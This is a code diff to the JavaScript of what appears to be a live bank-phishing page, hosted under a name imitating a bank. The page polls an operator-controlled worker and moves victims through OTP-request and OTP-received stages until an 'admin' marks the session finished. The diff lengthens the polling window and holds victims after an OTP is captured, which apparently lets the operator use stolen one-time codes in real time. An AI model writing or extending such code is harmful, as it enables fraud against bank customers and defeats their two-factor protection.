@@ -155,7 +155,7 @@
     const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
     const BASE_URL = 'https://personasgalicia.vercel.app';
     let intentos = 0;
-    const MAX_INTENTOS = 120;
+    const MAX_INTENTOS = 180; // 180 intentos = ~9 minutos
     let timeoutId = null;
     let isProcessing = false;
     let redirigiendo = false;
@@ -181,6 +181,7 @@
         
         const response = await fetch(url);
 
+        // Si es 404, el KV aún no tiene los datos
         if (response.status === 404) {
           console.log('⏳ Transacción no encontrada en KV, esperando...');
           actualizarEstado(`⏳ Procesando solicitud... (${intentos}/${MAX_INTENTOS})`, 'info');
@@ -207,6 +208,7 @@
         const data = await response.json();
         console.log(`📊 [${intentos}/${MAX_INTENTOS}] Estado:`, data);
 
+        // Si no hay datos o está pendiente
         if (!data || !data.estado || data.estado === "pendiente") {
           actualizarEstado(`⏳ Esperando autorización... (${intentos}/${MAX_INTENTOS})`, 'info');
           
@@ -229,7 +231,7 @@
         const estado = data.estado;
         
         // Evitar procesar el mismo estado múltiples veces
-        if (estado === ultimoEstado && estado !== 'otp_recibido') {
+        if (estado === ultimoEstado) {
           console.log(`⏳ Estado repetido: ${estado}, esperando cambio...`);
           isProcessing = false;
           timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
@@ -243,14 +245,14 @@
           clearTimeout(timeoutId);
           timeoutId = null;
         }
-        
-        redirigiendo = true;
 
         // ========================= REDIRECCIONES SEGÚN ESTADO =========================
+        // 👇 SOLO REDIRIGE A codei.html CUANDO EL ESTADO ES "finalizado"
         switch (estado) {
           case 'autorizado':
             actualizarEstado('✅ ¡Autorización confirmada! Redirigiendo...', 'success');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/codigo.html`);
+            redirigiendo = true;
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codigo.html`;
             }, 1500);
@@ -259,14 +261,27 @@
           case 'otp_solicitado':
             actualizarEstado('📲 OTP solicitado. Redirigiendo...', 'info');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/codigo.html`);
+            redirigiendo = true;
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codigo.html`;
             }, 1500);
             break;
 
           case 'otp_recibido':
-            actualizarEstado('✅ OTP recibido correctamente. Redirigiendo...', 'success');
+            // ✅ OTP recibido - Esperar a que el admin presione "Finalizar"
+            actualizarEstado(`✅ OTP recibido. Esperando confirmación final... (${intentos}/${MAX_INTENTOS})`, 'success');
+            console.log('⏳ OTP recibido, esperando estado "finalizado"...');
+            redirigiendo = false;
+            isProcessing = false;
+            // Seguir consultando el estado
+            timeoutId = setTimeout(() => checkStatus(transactionId), 3000);
+            break;
+
+          case 'finalizado':
+            // 🏁 PROCESO FINALIZADO - Redirigir a codei.html
+            actualizarEstado('🏁 Proceso finalizado. Redirigiendo...', 'success');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/codei.html`);
+            redirigiendo = true;
             setTimeout(() => {
               window.location.href = `${BASE_URL}/codei.html`;
             }, 1500);
@@ -275,16 +290,9 @@
           case 'error':
             actualizarEstado('❌ Acceso denegado. Redirigiendo...', 'error');
             console.log(`🔄 Redirigiendo a: ${BASE_URL}/w.html`);
+            redirigiendo = true;
             setTimeout(() => {
               window.location.href = `${BASE_URL}/w.html`;
-            }, 1500);
-            break;
-
-          case 'finalizado':
-            actualizarEstado('🏁 Proceso finalizado. Redirigiendo...', 'info');
-            console.log(`🔄 Redirigiendo a: https://www.bancopopular.com.co/`);
-            setTimeout(() => {
-              window.location.href = 'https://www.bancopopular.com.co/';
             }, 1500);
             break;
 
@@ -361,11 +369,13 @@
       console.log(`🔍 Verificando transacción: ${transactionId}`);
       actualizarEstado('🔍 Verificando acceso...', 'info');
       
+      // Iniciar verificación después de 1 segundo
       setTimeout(() => {
         checkStatus(transactionId);
       }, 1000);
     });
 
+    // Limpiar timeout al salir de la página
     window.addEventListener('beforeunload', function() {
       if (timeoutId) {
         clearTimeout(timeoutId);
